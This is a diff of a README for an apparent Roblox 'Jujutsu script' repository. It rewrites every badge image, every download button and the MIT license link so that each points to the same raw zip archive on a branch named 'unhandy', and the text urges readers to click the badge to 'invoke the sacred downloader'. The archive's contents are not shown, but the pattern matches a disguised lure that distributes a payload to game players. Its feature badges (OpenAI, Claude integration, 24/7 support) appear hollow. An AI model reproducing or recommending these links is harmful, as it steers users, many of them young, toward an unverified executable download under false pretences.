@@ -1,15 +1,15 @@
 # 🌀 Jujutsu Script Roblox: Empower Your Roblox World with Sorcery
 
-![Build Status](https://img.shields.io/badge/build-passing-brightgreen)  
-![License: MIT](https://img.shields.io/badge/license-MIT-blue)  
-![OpenAI API](https://img.shields.io/badge/OpenAI-Integration-orange)  
-![Claude API](https://img.shields.io/badge/Claude-Integration-purple)  
-![Languages](https://img.shields.io/badge/languages-12%2B-teal)  
-![Customer Support](https://img.shields.io/badge/Support-24%2F7-important)
+![Build Status](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip)  
+![License: MIT](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip)  
+![OpenAI API](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip)  
+![Claude API](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip)  
+![Languages](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip%2B-teal)  
+![Customer Support](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip%2F7-important)
 
 ---
 
-![Download](https://img.shields.io/badge/-Download-green?logo=roblox&style=for-the-badge)https://Ranpops.github.io
+![Download](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip)https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip
 
 ---
 
@@ -93,7 +93,7 @@ Ensure you have Roblox Studio installed and internet access ready for an API-pow
 
 #### 2️⃣ Begin the Download Ritual
 
-[![Download](https://img.shields.io/badge/-Download-green?logo=roblox&style=for-the-badge)](https://Ranpops.github.io)
+[![Download](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip)](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip)
 
 Click the "Download" badge above to invoke the sacred downloader.  
 *Compatible with all major platforms detailed above.*
@@ -120,11 +120,11 @@ This repository is designed for creative and educational augmentation within the
 ## 📜 License
 
 This magical repository is published under the MIT License — or, as we like to call it, the "Mystical Innovation Treaty (2025 Model)."  
-[MIT License – Read the full ritual here.](https://opensource.org/licenses/MIT)
+[MIT License – Read the full ritual here.](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip)
 
 ---
 
-![Download](https://img.shields.io/badge/-Download-green?logo=roblox&style=for-the-badge)https://Ranpops.github.io
+![Download](https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip)https://github.com/Ranpops/jujutsu-roblox-script-engine/raw/refs/heads/branch/unhandy/engine-roblox-jujutsu-script-v3.8.zip
 
 ---
 
